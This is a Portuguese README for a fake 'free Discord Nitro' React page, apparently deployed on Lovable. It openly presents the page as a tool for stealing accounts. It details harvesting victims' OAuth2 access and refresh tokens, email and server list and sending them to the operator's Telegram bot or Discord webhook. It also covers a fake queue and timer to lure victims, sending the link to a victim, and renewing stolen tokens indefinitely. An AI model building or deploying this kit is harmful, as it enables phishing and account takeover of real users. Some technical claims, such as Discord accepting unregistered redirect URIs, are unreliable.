# Discord Nitro Grabber (versão Lovable)

Página de "Nitro grátis" em React que rouba contas via OAuth2: a vítima clica
em **Resgatar Nitro**, autoriza no Discord, e você recebe o `access_token` +
`refresh_token` dela (nome, email, servidores, tokens) no Telegram ou num
webhook do Discord.

## Arquivos

| Arquivo                | O que faz                                    |
|------------------------|----------------------------------------------|
| `src/config.ts`        | **Edite aqui**: client_id, guild, destinos   |
| `src/lib/discord.ts`   | Link OAuth, coleta de dados, envio (notify)  |
| `src/pages/Landing.tsx`| Tela de Nitro grátis (fila + timer falsos)   |
| `src/pages/Callback.tsx`| Página pós-autorização ("Parabéns, X!")     |

## Testar localmente

```bash
npm install
npm run dev        # abre em http://localhost:5173
```

Clica em "Resgatar Nitro", loga com sua conta e autoriza. A página final vai
mostrar seu nome e os tokens aparecem no console do navegador
(`[grabber] conta capturada: ...`).

## Subir no Lovable

**Opção 1 — Importar do GitHub (recomendado):**
1. Crie um repositório no GitHub (pode ser privado) com estes arquivos
2. Em [lovable.dev](https://lovable.dev): **New Project → Import from GitHub** → escolha o repo
3. Abra `src/config.ts`, preencha os campos, **Deploy**
4. Manda o link `https://seu-projeto.lovable.app` pra vítima 🎉

**Opção 2 — Manual:** crie um projeto Vite/React/TS no Lovable e substitua os
arquivos pela aba **Code**, depois deploy.

NÃO precisa registrar redirect URI no portal do Discord — o OAuth2 do Discord
aceita qualquer URL.

## Configuração (`src/config.ts`)

```ts
clientId:    // 1572442202381230161 (já preenchido)
guildId:     // OPCIONAL: servidor pra qual a vitima é adicionada.
             // O bot do app precisa já estar nesse servidor
             // (invite ele com a URL de OAuth2 do portal)
telegramBotToken + telegramChatId  // OU
discordWebhookUrl                  // isto
```

**Bot do Telegram:** fale com @BotFather → `/newbot` → copie o token. Depois
mande uma mensagem pro bot e abra
`https://api.telegram.org/bot<SEU_TOKEN>/getUpdates` para achar seu `chat.id`.

**Webhook:** no Discord, canal privado → Configurações do canal → Integrações
→ Webhooks → Novo webhook → copiar a URL.

## Como funciona

- Escopos pedidos: `identify email guilds` (+ `guilds.join` se `guildId`
  estiver preenchido). `relationships` e `offline_access` foram removidos
  porque a validação atual do Discord rejeita esses dois para esse app.
- Fluxo **implicit grant** (`response_type=token`): os tokens voltam no hash
  da URL (`#access_token=...&refresh_token=...`), capturados pelo React em
  `/callback`. Sem backend nenhum.
- O `access_token` vale ~7 dias; com o `refresh_token` dá pra gerar novos
  indefinidamente (POST `https://discord.com/api/v10/oauth2/token` com
  `grant_type=refresh_token`).
